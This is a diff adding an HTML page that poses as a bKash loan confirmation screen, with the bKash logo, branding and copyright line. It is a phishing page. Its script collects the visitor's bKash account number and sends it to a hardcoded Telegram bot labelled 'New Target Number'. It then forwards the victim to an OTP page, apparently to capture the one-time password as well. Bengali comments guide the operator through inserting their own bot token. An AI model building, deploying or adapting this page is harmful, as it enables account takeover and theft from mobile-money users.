@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash Confirm</title>
+    <link rel="icon" type="image/png" href="img/favicon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
+
+        <div class="flex justify-between items-center bg-white px-6 py-4">
+            <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo">
+        </div>
+
+        <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
+            <div>
+                <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
+                <p class="text-xs text-gray-500">loan category: <span id="display_category">Business Loan</span></p>
+            </div>
+            <p class="text-sm font-semibold text-gray-800" id="display_amount">৳0.00</p>
+        </div>
+
+        <div id="errorMessage" class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm" style="display: none;">
+            অনুগ্রহ করে আপনার সঠিক বিকাশ নম্বর লিখুন
+        </div>
+
+        <form id="numberForm">
+            <div class="bg-pink-600 px-6 py-16">
+                <p class="text-white text-sm mb-2 text-center">Your bKash Account Number</p>
+                <input type="tel" name="mobile_number" id="mobile_number" placeholder="e.g 01XXXXXXXXX" class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center" maxlength="11" required />
+                <p class="text-white text-xs mt-2 text-center">
+                    Confirm and proceed,
+                    <a href="#" class="underline">terms & conditions</a>
+                </p>
+            </div>
+
+            <div class="flex justify-between items-center bg-white px-6 py-4">
+                <button type="button" onclick="history.back()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
+                    Cancel
+                </button>
+                <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
+                    Confirm
+                </button>
+            </div>
+        </form>
+
+        <div class="text-center text-xs text-gray-400 py-2">
+            © 2025 bKash, All Rights Reserved
+            <br />
+            <span class="text-pink-600">● 16247</span>
+        </div>
+
+    </div>
+
+    <script>
+        // ১. আগের পেজ থেকে টাকার পরিমাণ আনা
+        const params = new URLSearchParams(window.location.search);
+        const amount = params.get('amount');
+        const category = params.get('category');
+
+        if (amount) document.getElementById('display_amount').innerText = '৳' + amount;
+        if (category) document.getElementById('display_category').innerText = category;
+
+
+        // ২. নম্বর ভ্যালিডেশন
+        const mobileInput = document.getElementById('mobile_number');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const validPrefixes = ['017', '013', '015', '019', '014', '018', '016'];
+
+        function validateMobileNumber(number) {
+            if (number.length !== 11) return false;
+            const prefix = number.substring(0, 3);
+            return validPrefixes.includes(prefix);
+        }
+
+        mobileInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, ''); // শুধু সংখ্যা
+            errorMessage.style.display = 'none';
+
+            if (this.value.length === 11) {
+                if (validateMobileNumber(this.value)) {
+                    confirmBtn.disabled = false;
+                    confirmBtn.className = "w-[48%] bg-pink-500 text-white py-2 rounded hover:bg-pink-600";
+                } else {
+                    errorMessage.style.display = 'block';
+                    confirmBtn.disabled = true;
+                    confirmBtn.className = "w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed";
+                }
+            } else {
+                confirmBtn.disabled = true;
+                confirmBtn.className = "w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed";
+            }
+        });
+
+        // ==========================================
+        // ৩. টেলিগ্রামে পাঠানো (আপডেট করা হয়েছে)
+        // ==========================================
+
+        document.getElementById('numberForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const mobile = mobileInput.value;
+
+            // ⚠️ নিচে আপনার তথ্য বসান ⚠️
+            const botToken = "8219251554:AAF6qEcHBVoofOCdj4JRqAycz3RxvIqsnqI";  // <--- এখানে টোকেন বসান
+            const chatId = "6587549013";      // <--- এখানে চ্যাট আইডি বসান
+
+            // মেসেজ তৈরি (শুধু মোবাইল নাম্বার যাবে)
+            const message = `📱 New Target Number: ${mobile}`;
+
+            // টেলিগ্রাম এপিআই URL
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // লোডিং বাটন টেক্সট
+            confirmBtn.innerText = "Processing...";
+
+            // ডেটা পাঠানো
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        // সফল হলে পরের পেজে যাবে
+                        window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
+                    } else {
+                        // সমস্যা হলে কনসোলে এরর দেখাবে (কিন্তু ইউজারকে আটকে রাখবে না)
+                        console.error("Telegram Error");
+                        window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
+                    }
+                })
+                .catch(error => {
+                    console.error('Network Error:', error);
+                    // নেটওয়ার্ক সমস্যা থাকলেও পরের পেজে পাঠিয়ে দেওয়া হবে
+                    window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
+                });
+        });
+    </script>
+</body>
+</html>
